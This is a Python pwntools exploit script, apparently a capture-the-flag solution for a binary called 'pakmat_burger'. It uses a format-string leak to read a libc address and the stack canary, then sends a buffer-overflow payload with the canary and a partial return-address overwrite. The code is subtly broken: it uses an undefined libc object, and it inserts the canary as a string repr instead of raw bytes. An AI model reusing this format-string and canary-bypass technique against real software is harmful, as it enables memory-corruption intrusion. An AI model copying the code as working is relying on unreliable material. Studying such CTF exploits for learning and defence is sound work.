from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './pakmat_burger'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# libc = ELF("./libc.so.6")
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
os.environ["SECRET_MESSAGE"] = "YOKO"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()


secret = b"YOKO"
io.sendlineafter(b"Please enter your name:",b"%15$p%13$p")
io.recvuntil(b"Hi ")
libc.address = int(io.recv(14).decode(),16) - 128 - 171280
log.info("LIBC BASE: " + hex(libc.address))

canary = int(io.recv(18).decode(),16)
log.info("CANARY: " + hex(canary))

#gdb.attach(io,gdbscript="break *0x5555555554fe")
io.sendlineafter(b"enter the secret message:",secret)
io.sendlineafter(b"order?",b"abcd")

# gadgets found in libc
popRdi = p64(libc.address + 0x2a3e5)
ret = p64(libc.address + 0x2a3e6)

rop  = "A"* 37 + str(p64(canary)) + "A"*6
rop += "\x5a\x13"
log.info("payload: " + rop)

io.sendlineafter(b"soon:",rop)
print(io.recv())
io.close()

# io.interactive()